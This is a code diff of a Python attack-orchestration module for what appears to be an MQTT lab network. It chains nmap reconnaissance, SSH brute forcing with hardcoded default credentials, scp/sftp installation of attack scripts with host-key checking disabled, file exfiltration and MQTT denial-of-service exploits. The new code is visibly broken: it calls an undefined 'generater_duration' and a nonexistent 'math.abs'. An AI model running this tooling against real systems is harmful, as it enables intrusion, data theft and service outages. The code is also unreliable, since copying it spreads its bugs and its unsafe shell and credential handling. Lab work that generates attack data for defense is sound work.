@@ -1,4 +1,6 @@
 """Module to build and run customized APT attacks"""
+
+import math
 import os
 import pickle
 import random
@@ -17,6 +19,7 @@ from typing import Optional, List, Dict, Tuple, Literal
 
 class APTPhase(Enum):
     """Enum representing APT phases"""
+
     RECONNAISSANCE = 1
     BRUTE_FORCE = 2
     INSTALLATION = 3
@@ -52,8 +55,9 @@ class APTStep(ABC):
     def get_phase(self) -> APTPhase:
         pass
 
-    def _build_results(self, step_number: int, attack_name: str, start_time: datetime,
-                       iteration: int) -> Dict:
+    def _build_results(
+        self, step_number: int, attack_name: str, start_time: datetime, iteration: int
+    ) -> Dict:
         return {
             "phase_number": self.get_phase().value,
             "step_number": step_number,
@@ -69,15 +73,27 @@ class APTStep(ABC):
 class InstStep(APTStep, ABC):
     """Abstract Python class representing the step where the attacker installs malware on a target"""
 
-    def __init__(self, hostname: str, src_files: Optional[List[str]],
-                 dest_dir: str = "/home/ope", ssh_username: str = "ope", ssh_password: str = "maint",
-                 pause: float = 0.0):
+    def __init__(
+        self,
+        hostname: str,
+        src_files: Optional[List[str]],
+        dest_dir: str = "/home/ope",
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0.0,
+    ):
         super().__init__(hostname, pause)
         if src_files is None:
-            self.src_files = ["/dollar_char_attack.py", "/empty_connection_dos.py", "/pub_exfiltration.py",
-                              "/qos_mid_dos.py", "/slash_char_attack.py", "/user_property_attack.py",
-                              "/zero_len_attack.py",
-                              "/mqtt_utilities.py"]
+            self.src_files = [
+                "/dollar_char_attack.py",
+                "/empty_connection_dos.py",
+                "/pub_exfiltration.py",
+                "/qos_mid_dos.py",
+                "/slash_char_attack.py",
+                "/user_property_attack.py",
+                "/zero_len_attack.py",
+                "/mqtt_utilities.py",
+            ]
         else:
             self.src_files = src_files
         self.dest_dir = dest_dir
@@ -109,9 +125,18 @@ def show_progress(transferred_bytes: int, total_bytes: int) -> None:
 class ScpInstStep(InstStep):
     """Python class implementing the installation of attack scripts on a target machine via scp"""
 
-    def __init__(self, hostname: str, src_files: Optional[List[str]], dest_dir: str = "/home/ope",
-                 ssh_username: str = "ope", ssh_password: str = "maint", pause: int = 5.0):
-        super().__init__(hostname, src_files, dest_dir, ssh_username, ssh_password, pause)
+    def __init__(
+        self,
+        hostname: str,
+        src_files: Optional[List[str]],
+        dest_dir: str = "/home/ope",
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: int = 5.0,
+    ):
+        super().__init__(
+            hostname, src_files, dest_dir, ssh_username, ssh_password, pause
+        )
 
     def get_step_name(self) -> str:
         return "scp_inst"
@@ -119,15 +144,25 @@ class ScpInstStep(InstStep):
     def install(self) -> None:
         cmd_files = " ".join(self.src_files)
         os.system(
-            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no -C {cmd_files} {self.ssh_username}@{self.hostname}:{self.dest_dir} | tee -a ./out.log')
+            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no -C {cmd_files} {self.ssh_username}@{self.hostname}:{self.dest_dir} | tee -a ./out.log'
+        )
 
 
 class SftpInstStep(InstStep):
     """Python class implementing the installation of attack scripts on a target machine via sftp"""
 
-    def __init__(self, hostname: str, src_files: Optional[List[str]], dest_dir: str = "/home/ope",
-                 ssh_username: str = "ope", ssh_password: str = "maint", pause: int = 5.0):
-        super().__init__(hostname, src_files, dest_dir, ssh_username, ssh_password, pause)
+    def __init__(
+        self,
+        hostname: str,
+        src_files: Optional[List[str]],
+        dest_dir: str = "/home/ope",
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: int = 5.0,
+    ):
+        super().__init__(
+            hostname, src_files, dest_dir, ssh_username, ssh_password, pause
+        )
 
     def get_step_name(self) -> str:
         return "sftp_inst"
@@ -136,7 +171,9 @@ class SftpInstStep(InstStep):
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            ssh_client.connect(self.hostname, username=self.ssh_username, password=self.ssh_password)
+            ssh_client.connect(
+                self.hostname, username=self.ssh_username, password=self.ssh_password
+            )
             print(f"Connected to {self.hostname} with ssh", flush=True)
             sftp_client = paramiko.SFTPClient.from_transport(ssh_client.get_transport())
             if sftp_client:
@@ -145,7 +182,9 @@ class SftpInstStep(InstStep):
                 print(f"Failed to connect to {self.hostname}'s sftp server", flush=True)
             for src_file in self.src_files:
                 print(f"Beginning transfer of {src_file}...", flush=True)
-                sftp_client.put(src_file, self.dest_dir + src_file, callback=show_progress)
+                sftp_client.put(
+                    src_file, self.dest_dir + src_file, callback=show_progress
+                )
                 print(f"Completed transfer of {src_file}...", flush=True)
         finally:
             ssh_client.close()
@@ -154,11 +193,10 @@ class SftpInstStep(InstStep):
 class PauseStep(APTStep):
     """Python class to add more pauses between attack steps"""
 
-    def __init__(self, pause: float = 10):
+    def __init__(self):
         super().__init__(None)
-        if pause < 0:
-            raise ValueError("Pause must be a positive float")
-        self.long_pause = pause
+        self.i=0
+        self.upper_limit=10
 
     def get_step_name(self) -> str:
         return "pause"
@@ -168,27 +206,51 @@ class PauseStep(APTStep):
 
     def run_step(self, step_number: int, attack_name: str, iteration: int) -> Dict:
         start_time = datetime.now(tz=pytz.UTC)
+        if self.i>=10:
+            self.i=0
+            value=self.upper_limit*2**(random.choice([-1,1])*random.random())
+            if value<10:
+                self.upper_limit=10
+            elif value<300:
+                self.upper_limit=value
+            else:
+                self.upper_limit=300
         print("Pausing execution...")
-        time.sleep(random.random() * self.long_pause)
+        time.sleep(self.upper_limit*random.random())
+        self.i+=1
         return self._build_results(step_number, attack_name, start_time, iteration)
 
 
 class DiscStep(APTStep):
     """Python class for Discovery steps, it allows to build custom discovery steps by providing corresponding commands"""
 
-    def __init__(self, hostname: str, commands: str, ssh_username: str = "ope", ssh_password: str = "maint",
-                 pause: float = 0) -> None:
+    def __init__(
+        self,
+        hostname: str,
+        commands: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0,
+    ) -> None:
         super().__init__(hostname, pause)
         self.ssh_username = ssh_username
         self.ssh_password = ssh_password
-        self.commands = commands.split(';')
+        self.commands = commands.split(";")
 
     def get_step_name(self) -> str:
         return self.commands[0].split()[0]
 
     def run_step(self, step_number: int, attack_name: str, iteration: int) -> Dict:
         start_time = datetime.now(tz=pytz.UTC)
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password, self.commands, 0, self.pause, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            self.commands,
+            0,
+            self.pause,
+            "./out.log",
+        )
         return super()._build_results(step_number, attack_name, start_time, iteration)
 
     def get_phase(self) -> APTPhase:
@@ -196,11 +258,13 @@ class DiscStep(APTStep):
 
 
 class RecStep(APTStep):
-    """Python class for Reconnaissance steps, it allows to build custom reconnaissance steps by providing corresponding """
+    """Python class for Reconnaissance steps, it allows to build custom reconnaissance steps by providing corresponding"""
 
-    def __init__(self, hostname: Optional[str], commands: str, pause: float = 0) -> None:
+    def __init__(
+        self, hostname: Optional[str], commands: str, pause: float = 0
+    ) -> None:
         super().__init__(hostname, pause)
-        self.commands = commands.split(';')
+        self.commands = commands.split(";")
 
     def get_step_name(self) -> str:
         return self.commands[0].split()[0]
@@ -221,8 +285,9 @@ class NetstatRecStep(RecStep):
     """Python class implementing reconnaissance with netstat"""
 
     def __init__(self, pause: float = 0):
-        super().__init__(None, "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr",
-                         pause)
+        super().__init__(
+            None, "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr", pause
+        )
 
     def get_step_name(self) -> str:
         return "netstat"
@@ -232,8 +297,7 @@ class Nmap10T4RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T4"""
 
     def __init__(self, pause: float = 0):
-        super().__init__(None, "sudo nmap -sS -T4 -Pn 10.0.0.0/24",
-                         pause)
+        super().__init__(None, "sudo nmap -sS -T4 -Pn 10.0.0.0/24", pause)
 
     def get_step_name(self) -> str:
         return "nmap_10_T4"
@@ -243,8 +307,7 @@ class Nmap192T4RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T4"""
 
     def __init__(self, pause: float = 0):
-        super().__init__(None, "sudo nmap -sS -T4 -Pn 192.168.1.0/24",
-                         pause)
+        super().__init__(None, "sudo nmap -sS -T4 -Pn 192.168.1.0/24", pause)
 
     def get_step_name(self) -> str:
         return "nmap_192_T4"
@@ -254,8 +317,7 @@ class Nmap10T5RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T5"""
 
     def __init__(self, pause: float = 0):
-        super().__init__(None, "sudo nmap -sS -T5 -Pn 10.0.0.0/24",
-                         pause)
+        super().__init__(None, "sudo nmap -sS -T5 -Pn 10.0.0.0/24", pause)
 
     def get_step_name(self) -> str:
         return "nmap_10_T5"
@@ -265,8 +327,7 @@ class Nmap192T5RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T5"""
 
     def __init__(self, pause: float = 0):
-        super().__init__(None, "sudo nmap -sS -T5 -Pn 192.168.1.0/24",
-                         pause)
+        super().__init__(None, "sudo nmap -sS -T5 -Pn 192.168.1.0/24", pause)
 
     def get_step_name(self) -> str:
         return "nmap_192_T5"
@@ -275,9 +336,20 @@ class Nmap192T5RecStep(RecStep):
 class NmapSubDiscStep(DiscStep):
     """Python class implementing discovery by subscribing with nmap to publishers in the mqtt network"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 0):
-        super().__init__(hostname, "sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24", ssh_username,
-                         ssh_password, pause)
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            "sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24",
+            ssh_username,
+            ssh_password,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "nmap_sub"
@@ -286,9 +358,20 @@ class NmapSubDiscStep(DiscStep):
 class NmapMQTTDiscStep(DiscStep):
     """Python class implementing discovery by scanning the network from the inside with nmap"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 0):
-        super().__init__(hostname, "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24", ssh_username,
-                         ssh_password, pause)
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24",
+            ssh_username,
+            ssh_password,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "nmap_mqtt"
@@ -297,9 +380,20 @@ class NmapMQTTDiscStep(DiscStep):
 class NmapBannerDiscStep(DiscStep):
     """Python class implementing discovery by running the banner script"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 0):
-        super().__init__(hostname, "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24", ssh_username,
-                         ssh_password, pause)
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24",
+            ssh_username,
+            ssh_password,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "nmap_banner"
@@ -308,10 +402,22 @@ class NmapBannerDiscStep(DiscStep):
 class MqttCatDiscStep(DiscStep):
     """Python class implementing discovery by exploring MQTT configuration files"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint", pause: float = 0):
-        super().__init__(hostname, "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;\
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;\
                          cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log;\
-                          cat /var/log/syslog;cat /var/log/syslog", ssh_username, ssh_password, pause)
+                          cat /var/log/syslog;cat /var/log/syslog",
+            ssh_username,
+            ssh_password,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "mqtt_cat"
@@ -319,10 +425,16 @@ class MqttCatDiscStep(DiscStep):
 
 class BruteForceStep(APTStep):
     """Python class implementing the brute forcing of an ssh login.
-     This step already implements a nmap ping scanning to discover active hosts to brute force"""
+    This step already implements a nmap ping scanning to discover active hosts to brute force
+    """
 
-    def __init__(self, pause: float = 0, is_distributed: bool = False, action: Literal["m", "t"] = "m",
-                 host: Optional[str] = None):
+    def __init__(
+        self,
+        pause: float = 0,
+        is_distributed: bool = False,
+        action: Literal["m", "t"] = "m",
+        host: Optional[str] = None,
+    ):
         super().__init__(None, pause)
         self.is_distributed = is_distributed
         self.action = action
@@ -338,14 +450,16 @@ class BruteForceStep(APTStep):
         else:
             cmd_flag = "-nd"
         if self.host:
-            os.system(f"python3 ssh_brute_force.py {cmd_flag} -a {self.action} --host {self.host}")
+            os.system(
+                f"python3 ssh_brute_force.py {cmd_flag} -a {self.action} --host {self.host}"
+            )
         else:
             os.system(f"python3 ssh_brute_force.py {cmd_flag} -a {self.action}")
         time.sleep(random.random() * self.pause)
         return super()._build_results(step_number, attack_name, start_time, iteration)
 
     def get_step_name(self) -> str:
-        if self.action == 'm':
+        if self.action == "m":
             suffix = "_malformed"
         else:
             suffix = "_timing"
@@ -357,17 +471,24 @@ class BruteForceStep(APTStep):
 class ExploitStep(APTStep, ABC):
     """Abstract Python class implementing the exploits"""
 
-    def __init__(self, hostname: str, mqtt_username: Optional[str], mqtt_password: Optional[str],
-                 ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 0):
-        if duration < 0:
-            raise ValueError("duration must be positive")
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: Optional[str],
+        mqtt_password: Optional[str],
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        if mean_duration <= 0:
+            raise ValueError("mean_duration must be positive")
         super().__init__(hostname, pause)
         self.ssh_username = ssh_username
         self.ssh_password = ssh_password
         self.mqtt_username = mqtt_username
         self.mqtt_password = mqtt_password
-        self.duration = duration
+        self.mean_duration = mean_duration
 
     def get_phase(self) -> APTPhase:
         return APTPhase.EXPLOIT
@@ -389,11 +510,19 @@ class ExploitStep(APTStep, ABC):
 class ScpExfExploit(ExploitStep):
     """Exfiltrate data from a specified host to the local filesystem"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", src_file: str = "/home/ope/to_be_exfiltrated",
-                 dest_file="./scp_exfiltrated_data",
-                 timeout: float = 0, pause: float = 0):
-        super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        src_file: str = "/home/ope/to_be_exfiltrated",
+        dest_file="./scp_exfiltrated_data",
+        timeout: float = 0,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname, None, None, ssh_username, ssh_password, timeout, pause
+        )
         self.src_file = src_file
         self.dest_file = dest_file
 
@@ -402,16 +531,26 @@ class ScpExfExploit(ExploitStep):
 
     def run_exploit(self) -> None:
         os.system(
-            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no {self.ssh_username}@{self.hostname}:{self.src_file} {self.dest_file} | tee -a ./out.log')
+            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no {self.ssh_username}@{self.hostname}:{self.src_file} {self.dest_file} | tee -a ./out.log'
+        )
 
 
 class SftpExfExploit(ExploitStep):
     """Exfiltrate data from a specified host using a preinstalled sftp server and the ssh credentials"""
 
-    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint",
-                 src_file: str = "/home/ope/to_be_exfiltrated", dest_file="./sftp_exfiltrated_data",
-                 timeout: float = 0, pause: float = 0):
-        super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
+    def __init__(
+        self,
+        hostname: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        src_file: str = "/home/ope/to_be_exfiltrated",
+        dest_file="./sftp_exfiltrated_data",
+        timeout: float = 0,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname, None, None, ssh_username, ssh_password, timeout, pause
+        )
         self.src_file = src_file
         self.dest_file = dest_file
 
@@ -422,7 +561,9 @@ class SftpExfExploit(ExploitStep):
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            ssh_client.connect(self.hostname, username=self.ssh_username, password=self.ssh_password)
+            ssh_client.connect(
+                self.hostname, username=self.ssh_username, password=self.ssh_password
+            )
             print(f"Connected to {self.hostname} with ssh", flush=True)
             sftp_client = paramiko.SFTPClient.from_transport(ssh_client.get_transport())
             if sftp_client:
@@ -439,44 +580,107 @@ class SftpExfExploit(ExploitStep):
 class DollarCharExploit(ExploitStep):
     """Python class implementing dollar_char_attack exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "dollar_char"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 dollar_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 dollar_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class EmptyConnExploit(ExploitStep):
     """Python class implementing empty_connection_dos exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "empty_conn"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 empty_connection_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 empty_connection_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class PubExfExploit(ExploitStep):
     """Python class which implements the pub_exfiltration exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, topics: List[str],
-                 ssh_username: str = "ope", ssh_password: str = "maint", exf_file: str = "/home/ope/to_be_exfiltrated",
-                 duration: float = 10, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        topics: List[str],
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        exf_file: str = "/home/ope/to_be_exfiltrated",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
         self.topics = topics
         self.exf_file = exf_file
 
@@ -485,88 +689,197 @@ class PubExfExploit(ExploitStep):
 
     def run_exploit(self) -> None:
         cmd_topics = " ".join(self.topics)
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 pub_exfiltration.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -f {self.exf_file} -t {cmd_topics}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 pub_exfiltration.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)} -f {self.exf_file} -t {cmd_topics}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class QOSMIDExploit(ExploitStep):
     """Python class implementing the qos_mid_dos exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, number: int = 20, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        number: int = 20,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
         self.number = number
 
     def get_step_name(self) -> str:
         return "qos_mid"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 qos_mid_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -n {self.number}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 qos_mid_dos.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)} -n {self.number}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class SlashCharExploit(ExploitStep):
     """Python class implementing the slash_char_dos exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "slash_char"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 slash_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 slash_char_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class UserPropExploit(ExploitStep):
     """Python class implementing the user_property_attack exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, number: int = 20, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        number: int = 20,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
         self.number = number
 
     def get_step_name(self) -> str:
         return "user_prop"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 user_property_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -n {self.number}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 user_property_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)} -n {self.number}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class ZeroLenExploit(ExploitStep):
     """Python class implementing the zero_len_attack exploit"""
 
-    def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 0):
-        super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+    def __init__(
+        self,
+        hostname: str,
+        mqtt_username: str,
+        mqtt_password: str,
+        ssh_username: str = "ope",
+        ssh_password: str = "maint",
+        mean_duration: float = 10,
+        pause: float = 0,
+    ):
+        super().__init__(
+            hostname,
+            mqtt_username,
+            mqtt_password,
+            ssh_username,
+            ssh_password,
+            mean_duration,
+            pause,
+        )
 
     def get_step_name(self) -> str:
         return "zero_len"
 
     def run_exploit(self) -> None:
-        ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
-                         [
-                             f"python3 zero_len_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
-                         0, 0, "./out.log")
+        ssh.ssh_commands(
+            self.hostname,
+            self.ssh_username,
+            self.ssh_password,
+            [
+                f"python3 zero_len_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.generater_duration(self.mean_duration)}"
+            ],
+            0,
+            0,
+            "./out.log",
+        )
 
 
 class DistributedExploit(APTStep):
     """Python class which builds a distributed attack from an instance of type ExploitStep"""
 
-    def __init__(self, host_list: List[str], number_of_instances: int, exploit: ExploitStep, pause: float = 0):
+    def __init__(
+        self,
+        host_list: List[str],
+        number_of_instances: int,
+        exploit: ExploitStep,
+        pause: float = 0,
+    ):
         if isinstance(exploit, DistributedExploit):
-            raise ValueError("Cannot create a DistributedExploit from an instance of type DistributedExploit")
+            raise ValueError(
+                "Cannot create a DistributedExploit from an instance of type DistributedExploit"
+            )
         super().__init__(None, pause)
         self.original_exploit_name = exploit.get_step_name()
         self.distributed_exploits = []
@@ -583,11 +896,20 @@ class DistributedExploit(APTStep):
         threads = []
         print(f"Running exploit {self.get_step_name()}...")
 
-        def parallel_exploit(p_exploit: ExploitStep, p_step_number: int, p_attack_name: str, p_iteration: int):
+        def parallel_exploit(
+            p_exploit: ExploitStep,
+            p_step_number: int,
+            p_attack_name: str,
+            p_iteration: int,
+        ):
             p_exploit.run_step(p_step_number, p_attack_name, p_iteration)
 
         for exploit in self.distributed_exploits:
-            threads.append(threading.Thread(parallel_exploit(exploit, step_number, attack_name, iteration)))
+            threads.append(
+                threading.Thread(
+                    parallel_exploit(exploit, step_number, attack_name, iteration)
+                )
+            )
 
         for thread in threads:
             thread.start()
@@ -619,13 +941,23 @@ class APTAttack:
         file which is used to save the experiment results up to the point of an interruption by KeyboardInterrupt.
     """
 
-    def __init__(self, attack_steps: List[Tuple[APTStep, int]], attack_name: str, exp_details: List[Dict],
-                 file_path_i: str):
+    def __init__(
+        self,
+        attack_steps: List[Tuple[APTStep, int]],
+        attack_name: str,
+        exp_details: List[Dict],
+        file_path_i: str,
+        duration_std: int = 1,
+    ):
         self.steps = attack_steps
         self.attack_name = attack_name
         self.exp_details = exp_details
         self.file_path_i = file_path_i
         self.step_n = 1
+        self.duration_std = duration_std
+
+    def generate_duration(self, mean: float = 60) -> float:
+        return math.abs(random.gauss(mean, self.duration_std))
 
     def run(self, n_iterations: int = 1, starting_step_number: int = 1) -> List[Dict]:
         """
